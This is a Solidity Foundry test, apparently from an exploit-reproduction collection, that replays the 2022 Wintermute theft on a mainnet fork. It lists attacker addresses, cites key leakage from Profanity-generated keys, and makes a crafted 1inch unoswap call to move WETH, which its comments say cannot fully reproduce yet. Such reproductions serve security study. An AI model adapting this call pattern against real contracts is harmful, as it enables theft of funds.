// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../TestHarness.sol";
import {TokenBalanceTracker} from '../modules/TokenBalanceTracker.sol';

import {IERC20} from "../interfaces/IERC20.sol";
import {IWETH9} from '../interfaces/IWETH9.sol';

// forge test --match-contract Exploit_Wintermute -vvv
/*
On Sep 20, 2022 an attacker stole ~160MM USD in various tokens from Wintermute.
The attacker 


// Attack Overview
Total Lost: ~160MM USD
Attack Tx: https://etherscan.io/tx/0xeecba26d5eb7939257e5b3e646e4bc597b73e256a89cb84a6dfc58de250d8a38

Exploited Contract: 
Attacker Address: 0x0000000fE6A514a32aBDCDfcc076C85243De899b
Attacker Contract:0x0248F752802B2cfB4373cc0c3bC3964429385c26
Attack Block:  15572488

// Key Info Sources
Writeup: https://rekt.news/wintermute-rekt-2/
Article: https://www.certik.com/resources/blog/uGiY0j3hwOzQOMcDPGoz9-wintermute-hack

Principle: Keys Leak


ATTACK:
The attacker got control over the private keys of a privileged account which was generated by profanity (proven to have a severe security flaw on private key generation).

*/
interface I1inchRouter {
    function unoswap(
        IERC20 srcToken,
        uint256 amount,
        uint256 minReturn,
        bytes32[] calldata pools
    ) external payable returns(uint256 returnAmount);
}
contract Exploit_Wintermute is TestHarness, TokenBalanceTracker {
    address internal attacker = 0x0000000fE6A514a32aBDCDfcc076C85243De899b;
    address internal attackerContractAddr = 0x0248F752802B2cfB4373cc0c3bC3964429385c26;

    address internal wintermute = 0x00000000AE347930bD1E7B0F35588b92280f9e75;

    IWETH9 internal weth = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    I1inchRouter internal inchRouter = I1inchRouter(0x1111111254fb6c44bAC0beD2854e76F90643097d);

    function setUp() external {
        cheat.createSelectFork('mainnet', 15572487); // One block before the first WETH transfer.

        cheat.deal(address(this), 0);

        addTokenToTracker(address(weth));
        updateBalanceTracker(address(this));
    }

    function test_attack() external {
        logBalancesWithLabel('Balances of attacker contract before:', address(this));
        
        bytes32[] memory _pools = new bytes32[](1);
        _pools[0] = 0x00000000000000003b6d03400248f752802b2cfb4373cc0c3bc3964429385c26;

        // This call transfers the funds to attackerContractAddr
        // Because the address of this contract should match the attacker's, this is currently not reproduceable.
        // Currently (Nov 2022), foundry devs are working on this. 
        inchRouter.unoswap(IERC20(address(weth)), 5890696043499525252692, 1, _pools); 

        logBalancesWithLabel('Balances of attacker contract after:', address(this));
    }

}